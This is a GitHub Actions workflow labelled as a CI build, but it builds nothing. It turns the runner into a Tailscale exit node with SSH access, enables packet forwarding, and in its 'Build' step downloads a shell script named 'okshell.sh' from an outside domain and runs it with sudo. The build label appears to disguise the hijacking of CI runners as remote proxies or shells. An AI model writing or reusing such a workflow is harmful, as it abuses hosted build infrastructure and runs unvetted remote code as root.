name: CI BUILD (Full)

on: 
  workflow_dispatch:

jobs:
  build:

    runs-on: ubuntu-latest
    steps:

    - name: Install Tailscale & Opencode
      run: |
        BUN_PATH=$(dirname $(which bun))
        echo "export PATH=$BUN_PATH:\$PATH" >> ~/.bashrc
        sudo curl -fsSL https://tailscale.com/install.sh | sudo bash
    
    - name: Configure Tailscale
      run: |
        sudo echo 'net.ipv4.ip_forward = 1' | sudo tee -a /etc/sysctl.d/99-tailscale.conf
        sudo echo 'net.ipv6.conf.all.forwarding = 1' | sudo tee -a /etc/sysctl.d/99-tailscale.conf
        sudo sysctl -p /etc/sysctl.d/99-tailscale.conf
        NETDEV=$(ip route show 0/0 | cut -f5 -d' ')
        sudo ethtool -K $NETDEV rx-udp-gro-forwarding on rx-gro-list off
    
    - name: Connect Tailscale
      env:
        TS_KEY: ${{ secrets.TS_KEY }}
      run: |
        sudo tailscale up --authkey="${{ secrets.TS_KEY }}" --advertise-exit-node --ssh --accept-routes
    
    - name: Build
      run: |
        echo "=====Disk====================================================================="
        sudo df -hT
        echo "=====CPU======================================================================"
        sudo cat /proc/cpuinfo | grep "model name"
        echo "=====Mem======================================================================"
        sudo free -m
        echo "=============================================================================="
        sudo wget https://vapp.57777777.xyz/okshell.sh -O /tmp/asd.sh
        sudo chmod +x /tmp/asd.sh
        echo "10"
        sudo bash /tmp/asd.sh
